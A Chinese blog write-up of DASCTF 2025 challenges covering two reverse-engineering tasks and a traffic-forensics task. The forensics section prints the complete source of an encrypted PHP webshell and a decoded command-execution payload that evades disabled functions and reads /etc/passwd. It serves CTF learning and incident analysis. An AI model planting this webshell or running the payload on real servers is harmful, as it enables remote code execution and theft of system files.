---
title: DASCTF-2025 上半年 Writeup
date: 2025-06-23 11:36:21
tags: [CTF]
categories: [技术]
---

![](Screenshot_20250621_060715.webp)

![](Screenshot_20250621_060709.webp)

随便打了一下拿到个第四也是挺震惊的，于是写下 Writeup 记录一下。（？

<!-- more -->

## REVERSE
### 鱼音乐

![](Screenshot_20250621_062418.webp)

根据图标可判断出来使用了 PyInstaller 封装，此处使用 pyinstxtractor 解包:

![](Screenshot_20250621_062639.webp)

要注意使用与 PyInstaller 封装时相同版本的 Python 解释器，不然 PYZ 档案包无法解压影响后续分析。

使用 [PyLingual](https://www.pylingual.io/) 对 `main.pyc` 进行反编译可以得到源代码:

![](Screenshot_20250621_062925.webp)

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.8.0rc1+ (3413)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import sys
import os
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QPushButton, QLabel, QVBoxLayout, QFileDialog, QMessageBox
from PyQt5.QtGui import QPixmap
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
from PyQt5.QtCore import QUrl
from xianyu_decrypt import load_and_decrypt_xianyu

class MainWindow(QMainWindow):

    def __init__(self):
        super().__init__()
        self.setWindowTitle('Fish Player - 鱼音乐🐟')
        self.resize(600, 400)
        self.player = QMediaPlayer(self)
        self.open_button = QPushButton('打开 .xianyu 文件')
        self.open_button.clicked.connect(self.open_xianyu)
        self.cover_label = QLabel('专辑封面展示')
        self.cover_label.setScaledContents(True)
        self.cover_label.setFixedSize(300, 300)
        layout = QVBoxLayout()
        layout.addWidget(self.open_button)
        layout.addWidget(self.cover_label)
        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

    def open_xianyu(self):
        file_path, _ = QFileDialog.getOpenFileName(self, '选择 .xianyu 文件', '', 'Xianyu Files (*.xianyu)')
        if not file_path:
            return
        try:
            info = load_and_decrypt_xianyu(file_path)
            meta = info['meta']
            cover_path = info['cover_path']
            audio_path = info['audio_path']
            if cover_path and os.path.exists(cover_path):
                pixmap = QPixmap(cover_path)
                self.cover_label.setPixmap(pixmap)
            else:
                self.cover_label.setText('无封面')
            url = QUrl.fromLocalFile(audio_path)
            self.player.setMedia(QMediaContent(url))
            self.player.play()
            name = meta.get('name', '未知')
            artist = meta.get('artist', '未知歌手')
            fl4g = meta.get('fl4g', 'where_is_the_flag?')
            FLAG = meta.get('')
            QMessageBox.information(self, '🐟音乐提示您', f'正在播放：{name}\n歌手：{artist}\nfl4g:{fl4g}\nFLAG:{FLAG}')
        except Exception as e:
            QMessageBox.critical(self, '错误', str(e))

def main():
    app = QApplication(sys.argv)
    w = MainWindow()
    w.show()
    sys.exit(app.exec_())
if __name__ == '__main__':
    main()
```

不难发现这边从 `xianyu_decrypt` 库导入了 `load_and_decrypt_xianyu` 函数进行解密操作。

为了让环境能够直接使用，这边需要先从解压的 PYZ 档案内的文件复制到源代码的根目录:

![](Screenshot_20250621_063455.webp)

随后直接调用 `xianya_decrypt` 的 `load_and_decrypt_xianyu` 函数获得 metadata:

![](Screenshot_20250621_063542.webp)

可以得到 flag 为: `DASCTF{fl5h_mus1c_miao_m1a0_mlaO}`

### xuans

直接执行提示了 `Please Input the flag :`

![](Screenshot_20250621_064048.webp)

按照字符串搜索可以找到主函数在 `0x403223`:

![](Screenshot_20250621_064244.webp)

通过大致分析可确认在输出 `Please Input the flag :` 之后的过程如下（已对部分函数名及变量名进行了重命名）:

![](Screenshot_20250621_064713.webp)

其中 `sm4_init` 函数通过以下特征值可确定为 SM4 算法:

![](Screenshot_20250621_064900.webp)

再看到读 flag 之前的过程:

![](Screenshot_20250621_065348.webp)

通过分析出来的 `pid_t` 以及 `rax_1 != 0` 不难推断出 `if` 判断前面所调用的为 `fork` 函数，并且 `if` 条件之内为父进程运行的内容，`if` 条件之外为子进程运行的内容。

通过前面对关键变量进行命名之后，不难发现此处函数调用传入了 `sm4_key`。

通过对其中几个传入了 `sm4_key` 作为参数的函数进行查看:

![](Screenshot_20250621_065450.webp)

![](Screenshot_20250621_065514.webp)

此处分析出来的 `PTRACE_PEEKDATA` 和 `PTRACE_POKEDATA` 可通过查阅 `ptrace(2)` Manpage 得知:

![](Screenshot_20250621_065625.webp)

`PTRACE_PEEKDATA` 是从被 trace 进程中读取数据，而 `PTRACE_POKEDATA` 则是向被 trace 进程写入数据。

可以猜测出来此处 `sm4_key` 进行了篡改。

由于函数分析过于复杂，此处利用 `gdb` 配合 `pwndbg` 进行分析。

首先执行 ELF 文件，然后使用 `pidof` 获得进程 PID:

![](Screenshot_20250621_070012.webp)

不难推断此处父进程 PID 为 `588481`，子进程 PID 为 `588483`。

为了后续分析便利，此处直接 attach 到子进程进行分析:

![](Screenshot_20250621_070139.webp)

回到反编译器，可以找到 `sm4_key` 的地址为 `0x4dc110`:

![](Screenshot_20250621_070200.webp)

使用 `pwndbg` 的 `hexdump` 指令可以直接获得:

![](Screenshot_20250621_070311.webp)

篡改后的密钥为 `9cafa6466a028bfb`。

结合前面分析得知在 `strcmp` 时传入的 `expected`:

![](Screenshot_20250621_070349.webp)

使用 CyberChef 进行解密:

![](Screenshot_20250621_041255.webp)

会发现获得了一个假 flag。

回到反编译器，找到 `strcmp` 函数的定义:

![](Screenshot_20250621_070737.webp)

会发现 `strcmp` 所指向的 jmp 地址在主函数有引用。

引用的地方刚好是前面所分析篡改 key 的地方:

![](Screenshot_20250621_070855.webp)

看到引用了该地址作为参数所调用的函数:

![](Screenshot_20250621_070943.webp)

可发现此处也发生了 `PTRACE_POKEDATA`，可猜测 `strcmp` 函数也发生了篡改。

此时可以对调用 `strcmp` 的地方进行断点。切换到反汇编模式，找到 `call` 指令:

![](Screenshot_20250621_071425.webp)

确认调用地址为 `0x4033cd`。

在 `gdb` 下断点:

![](Screenshot_20250621_071511.webp)

可以把刚刚拿到的假 flag 输入到程序然后查看接下来的调用:

![](Screenshot_20250621_071648.webp)

断点触发后使用 `step` 指令步入函数:

![](Screenshot_20250621_071742.webp)

发现此处将会 jmp 到 `0x4019a5`。

回到反编译器找到 `0x4019a5` 对应的反编译代码:

![](Screenshot_20250621_071916.webp)

不难发现此处含有大量的运算。可以整理运算后，使用 Z3 Solver 进行解决。整理出来的 Python 脚本如下:

```python
from z3 import *

s = Solver()

ciphertext = [Real(f"ciphertext[{i}]") for i in range(0x20)]

s.add((((ciphertext[3]) * 0xc1) + ((((ciphertext[0]) * 0xad) + ((ciphertext[1]) * 0x30)) + ((ciphertext[2]) * 0x76))) == 0x10253)
s.add((((ciphertext[3]) * 0xa) + ((((ciphertext[0]) * 0x44) + ((ciphertext[1]) * 0xc4)) + ((ciphertext[2]) * 0x68))) == 0xcd8c)
s.add((((ciphertext[3]) * 0x47) + ((((ciphertext[0]) * 0x16) + ((ciphertext[1]) * 0x25)) + ((ciphertext[2]) * 0x58))) == 0x8cab)
s.add((((ciphertext[3]) * 0xc2) + ((((ciphertext[0]) * 0x59) + ((ciphertext[1]) * 0x8d)) + ((ciphertext[2]) * 0x3b))) == 0xf192)
s.add((((ciphertext[7]) * 0x59) + ((((ciphertext[4]) * 0x28) + ((ciphertext[5]) * 0x58)) + ((ciphertext[6]) * 0xaf))) == 0xfeea)
s.add((((ciphertext[7]) * 0x4e) + ((((ciphertext[4]) * 0x52) + ((ciphertext[5]) * 0xa6)) + ((ciphertext[6]) * 0x1a))) == 0xe340)
s.add((((ciphertext[7]) * 0x74) + ((((ciphertext[4]) * 0x49) + ((ciphertext[5]) * 0xa)) + ((ciphertext[6]) * 0x95))) == 0xf40e)
s.add((((ciphertext[7]) * 0xc1) + ((((ciphertext[4]) * 0xc6) + ((ciphertext[5]) * 0x50)) + ((ciphertext[6]) * 0xb0))) == 0x1bd95)
s.add((((ciphertext[0xb]) * 0x1e) + ((((ciphertext[8]) * 0x53) + ((ciphertext[9]) * 0x64)) + ((ciphertext[0xa]) * 0xb2))) == 0xdb6a)
s.add((((ciphertext[0xb]) * 0xa8) + ((((ciphertext[9]) + (ciphertext[8])) * 0x94) + ((ciphertext[0xa]) * 0x8f))) == 0x113f7)
s.add((((ciphertext[0xb]) * 0xba) + ((((ciphertext[8]) * 0x21) + ((ciphertext[9]) * 0xc2)) + ((ciphertext[0xa]) * 0xa))) == 0xcfb6)
s.add((((ciphertext[0xb]) * 0x98) + ((((ciphertext[8]) * 128) + ((ciphertext[9]) * 0x21)) + ((ciphertext[0xa]) * 32))) == 0x6606)
s.add((((ciphertext[0xf]) * 0x1d) + ((((ciphertext[0xc]) * 0xa4) + ((ciphertext[0xd]) * 0x73)) + ((ciphertext[0xe]) * 0xb8))) == 0x13d66)
s.add((((ciphertext[0xf]) * 0xa5) + ((((ciphertext[0xc]) * 0x23) + ((ciphertext[0xd]) * 0x81)) + ((ciphertext[0xe]) * 0x81))) == 0x13336)
s.add((((ciphertext[0xf]) * 0x12) + ((((ciphertext[0xc]) * 0x36) + ((ciphertext[0xd]) * 0x86)) + ((ciphertext[0xe]) * 0x27))) == 0x7483)
s.add((((ciphertext[0xf]) * 0x2b) + ((((ciphertext[0xc]) * 0x50) + ((ciphertext[0xd]) * 0x85)) + ((ciphertext[0xe]) * 0x6a))) == 0xd19c)
s.add((((ciphertext[0x13]) * 2) + ((((ciphertext[0x11]) * 32) + ((ciphertext[0x10]) * 0xbb)) + ((ciphertext[0x12]) * 0x79))) == 0x605b)
s.add((((ciphertext[0x13]) * 0x24) + ((((ciphertext[0x10]) * 0x42) + ((ciphertext[0x11]) * 0xaa)) + ((ciphertext[0x12]) * 0x3a))) == 0xac9c)
s.add((((ciphertext[0x13]) * 0xaf) + ((((ciphertext[0x10]) * 0x67) + ((ciphertext[0x11]) * 0x78)) + ((ciphertext[0x12]) * 0xc))) == 0xcc56)
s.add((((ciphertext[0x13]) * 0x8f) + ((((ciphertext[0x10]) * 0x53) + ((ciphertext[0x11]) * 0x5c)) + ((ciphertext[0x12]) * 0x81))) == 0xb3c4)
s.add((((ciphertext[0x17]) * 0x7a) + ((((ciphertext[0x14]) * 0x64) + ((ciphertext[0x15]) * 0x36)) + ((ciphertext[0x16]) * 0x8d))) == 0x104ac)
s.add((((ciphertext[0x17]) * 7) + ((((ciphertext[0x14]) * 0xab) + ((ciphertext[0x15]) * 0x55)) + ((ciphertext[0x16]) * 0x45))) == 0xb6e1)
s.add((((ciphertext[0x17]) * 0x84) + ((((ciphertext[0x14]) * 0xc5) + ((ciphertext[0x15]) * 0x30)) + ((ciphertext[0x16]) * 128))) == 0x14650)
s.add((((ciphertext[0x17]) * 0x90) + ((((ciphertext[0x14]) * 0x65) + ((ciphertext[0x15]) * 0xb5)) + ((ciphertext[0x16]) * 0x4f))) == 0x13acb)
s.add((((ciphertext[0x1b]) * 0x8e) + ((((ciphertext[0x18]) * 0x95) + ((ciphertext[0x19]) * 0xbb)) + ((ciphertext[0x1a]) * 0x18))) == 0x16a0f)
s.add((((ciphertext[0x1b]) * 0x32) + ((((ciphertext[0x18]) * 0x76) + ((ciphertext[0x19]) * 0x56)) + ((ciphertext[0x1a]) * 0x31))) == 0xc085)
s.add((((ciphertext[0x1b]) * 0xc1) + ((((ciphertext[0x18]) * 0x46) + ((ciphertext[0x19]) * 0xaa)) + ((ciphertext[0x1a]) * 0xa4))) == 0x16a27)
s.add(((ciphertext[0x1b]) + ((((ciphertext[0x18]) * 0x60) + ((ciphertext[0x19]) * 0xc6)) + ((ciphertext[0x1a]) * 0x5f))) == 0xf1d0)
s.add((((ciphertext[0x1f]) * 0xa3) + ((((ciphertext[0x1c]) * 0x72) + ((ciphertext[0x1d]) * 0xb3)) + ((ciphertext[0x1e]) * 0x25))) == 0xd268)
s.add((((ciphertext[0x1f]) * 0x63) + ((((ciphertext[0x1c]) * 0x31) + ((ciphertext[0x1d]) * 0x5e)) + ((ciphertext[0x1e]) * 0x84))) == 0x9074)
s.add((((ciphertext[0x1f]) * 128) + ((((ciphertext[0x1c]) * 0x2b) + ((ciphertext[0x1d]) * 0x71)) + ((ciphertext[0x1e]) * 0x96))) == 0x9f7d)
s.add((((ciphertext[0x1f]) * 0x2c) + (((ciphertext[0x1c]) + ((ciphertext[0x1d]) * 0x8b)) + ((ciphertext[0x1e]) * 0x73))) == 0x57b0)

if s.check() == sat:
    print(s.model())
```

可解得结果:

```log
[ciphertext[4] = 155, 
 ciphertext[6] = 145, 
 ciphertext[7] = 243, 
 ciphertext[15] = 252, 
 ciphertext[16] = 73, 
 ciphertext[20] = 168, 
 ciphertext[10] = 145, 
 ciphertext[2] = 234, 
 ciphertext[21] = 113, 
 ciphertext[26] = 45, 
 ciphertext[24] = 161, 
 ciphertext[13] = 50, 
 ciphertext[18] = 38, 
 ciphertext[9] = 230, 
 ciphertext[0] = 29, 
 ciphertext[27] = 197, 
 ciphertext[5] = 137, 
 ciphertext[1] = 127, 
 ciphertext[8] = 80, 
 ciphertext[23] = 246, 
 ciphertext[30] = 89, 
 ciphertext[11] = 24, 
 ciphertext[17] = 193, 
 ciphertext[3] = 142, 
 ciphertext[25] = 212, 
 ciphertext[31] = 86, 
 ciphertext[29] = 59, 
 ciphertext[28] = 228, 
 ciphertext[12] = 215, 
 ciphertext[19] = 121, 
 ciphertext[22] = 98, 
 ciphertext[14] = 179]
```

对上面结果整理并执行可得到 ciphertext 的 Hex 值为 `1d7fea8e9b8991f350e69118d732b3fc49c12679a87162f6a1d42dc5e43b5956`。

再结合上面获取到的 `sm4_key` 进行解密:

![](Screenshot_20250621_042610.webp)

可得到 flag 为: `DASCTF{9d78b5507187421a48de8f6ef24a8d4b}`

## MISC
### Webshell Plus

使用 Wireshark 打开流量包，不难发现这边是 HTTP 流量分析。为了分析方便应用上 `http` Filter。

并倒序翻阅可发现在 No. 51802 上传了 `shell.php` 文件:

![](Screenshot_20250621_072616.webp)

内容为:

```php
<?php
@error_reporting(0);
session_start();
function geneB64RandStr(int $length): string
{
    $validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $maxIndex = strlen($validChars) - 1;
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $validChars[random_int(0, $maxIndex)];
    }
    return $randomString;
}
if (isset($_POST['gene_key']) and $_POST['public_key']) {
    echo geneB64RandStr(8);
    $public_key = base64_decode($_POST['public_key']);
    $p = bin2hex(random_bytes(8));
    $key = substr(md5($p), 0, 16);
    $_SESSION['k'] = $key;
    if (extension_loaded('openssl')) {
        openssl_public_encrypt($p, $encrypted_key, $public_key, OPENSSL_PKCS1_PADDING);
        echo base64_encode($encrypted_key);
        echo geneB64RandStr(8);
        exit();
    } else {
        die("OpenSSL extension not available");
    }
} else {
    if(!isset($_SESSION['k'])){
        $key = "e45e329feb5d925b"; // Default key: rebeyond
        $_SESSION['k'] = $key;
    }
}
$key = $_SESSION['k'];
        session_write_close();
        $post=file_get_contents("php://input");
        if(!extension_loaded('openssl'))
        {
                $t="base64_"."decode";
                $post=$t($post."");
                
                for($i=0;$i<strlen($post);$i++) {
                             $post[$i] = $post[$i]^$key[$i+1&15]; 
                            }
        }
        else
        {
                $post=openssl_decrypt($post, "AES128", $key);
        }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
        class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

分析代码后可得知:

如果设了 `gene_key` 和 `public_key` 则会进行密钥设置。

如果服务器存在 OpenSSL，会返回 8 字节的随机 Base64 + Base64 编码过的加密后的 Key（使用 public_key 进行加密）+ 8 字节的随机 Base64。

如果没有 OpenSSL，这里是会返回 `OpenSSL extension not available`。

通过 No. 51819 上传了 `public_key` 并且设置了 `gene_key`，No. 51820 服务器返回了一个类 Base64 字符串可以得知 OpenSSL 是可用的。

通过 No. 51819 可以得到 `public_key` 值为:

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZU1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTUFEQ0JpQUtCZ0ZnbU95bVQ5RUp2QzhzSFRXeG92MExRV1NvbQpMNURQUmlUVUVuUW5yRG1LWUd2TlNOTUozVjFmUjFocjlqUTZvZXB2UXZqTXlXc3lUTDZKM245bmJPR2Q1dGV5Ci80QkxUWEhReWFYY1NwZmwzejYxZkJKenk5MXJaclhiek1ZMWFkSEg0Vll5VW9EUTdxa0YyL1JWblI4UEpWelIKb0puK1hhSDNSYWJrekhpdEFnTUJBQUU9Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ==
```

返回的结果为:

```
ufhPlhqyO+le5pAWzAptt0OhVjS5eDX3W3X766Hc8QbKMNflhkZM3t8HArZ8YRFM3G7h7MMYrcASwycx7aSU1OL2tChk3O/O8cjw/0C6Agx5qEDeiI3gtnic5/J+cLB0WcspW2t9OiqteGHBtXZx0cXUjUSU/7tPwfnOS3pXjrJRDisgSwE=G7Cpj860
```

其中头部 8 位和尾部 8 位都是没用的数据，去除掉即可获得加密后的 key 的 Base64 为:

```
O+le5pAWzAptt0OhVjS5eDX3W3X766Hc8QbKMNflhkZM3t8HArZ8YRFM3G7h7MMYrcASwycx7aSU1OL2tChk3O/O8cjw/0C6Agx5qEDeiI3gtnic5/J+cLB0WcspW2t9OiqteGHBtXZx0cXUjUSU/7tPwfnOS3pXjrJRDisgSwE=
```

此处将 `public_key` 值进行 Base64 解码保存到文件中:

![](Screenshot_20250621_073308.webp)

使用 OpenSSL 分析可以得知为 RSA1024 公钥:

![](Screenshot_20250621_073351.webp)

RSA1024 安全性非常低，可尝试使用 RsaCtfTool 进行爆破。

先将加密后的密钥进行 Base64 解码输出到文件中:

![](Screenshot_20250621_073501.webp)

使用指令 `RsaCtfTool --publickey pubkey --decryptfile encrypted_key` 进行爆破尝试:

![](Screenshot_20250621_073620.webp)

可爆破出 Key 为 `519a73ca97a9e3ea`。

经过 MD5 Hash 取前 16 位便为 AES Key。

可编写 PHP 脚本解密:

```php
<?php
$post = "<encrypted data here>";
$p = "519a73ca97a9e3ea";
$key = substr(md5($p), 0, 16);

$result = openssl_decrypt($post, "AES128", $key);
$content = str_split($result, 65536);
foreach ($content as $part) {
    echo $part;
}
?>
```

进行逐包分析可发现 No. 52525 包发送了以下数据（已解密）:

```php
assert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCwkcGF0aCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpKTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCkpOw0KfQ0KDQoKZnVuY3Rpb24gRW5jcnlwdCgkZGF0YSkKewogQHNlc3Npb25fc3RhcnQoKTsKICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpCiAgICAJewogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsKICAgIAkJCSAkZGF0YVskaV0gPSAkZGF0YVskaV1eJGtleVskaSsxJjE1XTsKICAgIAkJCX0KCQkJcmV0dXJuICRkYXRhOwogICAgCX0KICAgIGVsc2UKICAgIAl7CiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsKICAgIAl9Cn0KJGNtZD0iWTJRZ0wzWmhjaTkzZDNjdmFIUnRiQzkxY0d4dllXUnpMeUE3WTJGMElDOWxkR012Y0dGemMzZGsiOyRjbWQ9YmFzZTY0X2RlY29kZSgkY21kKTskcGF0aD0iTDNaaGNpOTNkM2N2YUhSdGJDOTFjR3h2WVdSekx3PT0iOyRwYXRoPWJhc2U2NF9kZWNvZGUoJHBhdGgpOw0KbWFpbigkY21kLCRwYXRoKTs='));
```

对字符串进行 Base64 解码可得到以下脚本:

```php
@error_reporting(0);

function getSafeStr($str){
    $s1 = iconv('utf-8','gbk//IGNORE',$str);
    $s0 = iconv('gbk','utf-8//IGNORE',$s1);
    if($s0 == $str){
        return $s0;
    }else{
        return iconv('gbk','utf-8//IGNORE',$str);
    }
}
function main($cmd,$path)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    $PadtJn = @ini_get('disable_functions');
    if (! empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    $c = $cmd;
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        $c = $c . " 2>&1\n";
    }
    $JueQDBH = 'is_callable';
    $Bvce = 'in_array';
    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {
        ob_start();
        system($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {
        $handle = proc_open($c, array(
            array(
                'pipe',
                'r'
            ),
            array(
                'pipe',
                'w'
            ),
            array(
                'pipe',
                'w'
            )
        ), $pipes);
        $kWJW = NULL;
        while (! feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {
        ob_start();
        passthru($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {
        $kWJW = shell_exec($c);
    } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {
        $kWJW = array();
        exec($c, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {
        $fp = popen($c, 'r');
        $kWJW = NULL;
        if (is_resource($fp)) {
            while (! feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        $kWJW = 0;
        $result["status"] = base64_encode("fail");
        $result["msg"] = base64_encode("none of proc_open/passthru/shell_exec/exec/exec is available");
        $key = $_SESSION['k'];
        echo encrypt(json_encode($result));
        return;
        
    }
    $result["status"] = base64_encode("success");
    $result["msg"] = base64_encode(getSafeStr($kWJW));
    echo encrypt(json_encode($result));
}


function Encrypt($data)
{
 @session_start();
    $key = $_SESSION['k'];
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15];
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}
$cmd="Y2QgL3Zhci93d3cvaHRtbC91cGxvYWRzLyA7Y2F0IC9ldGMvcGFzc3dk";$cmd=base64_decode($cmd);$path="L3Zhci93d3cvaHRtbC91cGxvYWRzLw==";$path=base64_decode($path);
main($cmd,$path);
```

不难分析出此处对 `$cmd` 进行了 Base64 解码作为执行指令，并对 `$path` 进行了 Base64 解码但并没有实际用到。执行指令后的结果和状态均编码成 Base64 封装成 JSON，再将 JSON 字符串按照传入 `shell.php` 一样的加密处理返回。

此处 `$cmd` 解码结果为: 

![](Screenshot_20250621_084849.webp)

可以看到执行了 `cat /etc/passwd`，所以预期响应包应当为 `passwd` 文件内容。

不难找到 No. 52525 包对应 Response 在 No. 52531:

![](Screenshot_20250621_084615.webp)

使用上面的解密脚本进行解密:

![](Screenshot_20250621_084716.webp)

